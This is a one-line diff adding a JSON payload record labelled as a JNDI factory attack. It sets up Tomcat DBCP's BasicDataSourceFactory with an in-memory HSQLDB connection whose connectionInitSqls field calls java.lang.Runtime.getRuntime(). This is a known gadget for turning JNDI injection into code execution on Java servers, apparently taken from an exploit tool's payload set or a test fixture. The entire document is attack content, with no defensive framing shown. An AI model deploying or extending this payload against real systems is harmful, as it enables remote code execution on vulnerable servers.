@@ -1,0 +1,1 @@
+{"attack_type":"jndi_factory","factory_class":"org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory","reference_class":"javax.sql.DataSource","factory_attrs":{"url":"jdbc:hsqldb:mem:test","driverClassName":"org.hsqldb.jdbc.JDBCDriver","connectionInitSqls":"CALL \"java.lang.Runtime\".getRuntime()"}}
